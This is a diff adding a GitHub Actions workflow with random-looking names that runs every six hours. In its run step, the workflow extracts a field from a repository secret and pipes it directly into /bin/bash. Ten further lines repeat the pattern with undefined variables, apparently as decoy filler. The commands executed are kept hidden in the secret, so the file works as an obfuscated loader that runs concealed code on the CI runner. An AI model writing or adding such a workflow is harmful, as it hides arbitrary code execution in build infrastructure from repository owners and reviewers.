@@ -1,0 +1,27 @@
+name: xueqingfeng8712
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '57 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xueqingfeng8712
+        env:
+          gkfn02: ${{ secrets.gkfn02 }}
+        run: |
+          echo $gkfn02 | jq -r .qija93 | /bin/bash
+          echo $lr99962 | jq -r .bon3 | /bin/bash
+          echo $ufuct0 | jq -r .oz8 | /bin/bash
+          echo $tqe165 | jq -r .yky595 | /bin/bash
+          echo $peao4757 | jq -r .xhqc9022 | /bin/bash
+          echo $vwxw26 | jq -r .ysl49570 | /bin/bash
+          echo $joosz83713 | jq -r .cj26190 | /bin/bash
+          echo $b7 | jq -r .h3969 | /bin/bash
+          echo $yo49401 | jq -r .cwo725 | /bin/bash
+          echo $w6602 | jq -r .upb44 | /bin/bash
+          echo $xskpu5357 | jq -r .ppr430 | /bin/bash
+
